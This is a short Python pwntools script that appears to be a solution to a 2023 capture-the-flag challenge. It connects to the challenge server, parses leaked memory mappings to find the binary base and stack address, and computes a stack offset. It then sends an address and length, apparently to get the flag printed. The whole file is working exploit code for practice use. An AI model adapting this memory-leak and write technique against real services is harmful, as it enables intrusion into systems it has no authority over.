from pwn import *

context.log_level = "DEBUG"

r = remote("wfw2.2023.ctfcompetition.com", 1337)
flaglen = 13

s = r.recvuntil(b"\n\n").decode().splitlines()[2:]
base = None
for line in s:
  if "chal" in line and base is None:
    base = int(line.split("-")[0], 16)
  if "stack" in line:
    stack = int(line.split("-")[1].split()[0], 16)

print(hex(base), hex(stack))

ret = stack - (0x7ffffffff000-0x7fffffffdbd8)
print(hex(ret))
r.sendline(b"0x%x %d" % ((ret-flaglen+1), flaglen))
r.sendline()
r.interactive()
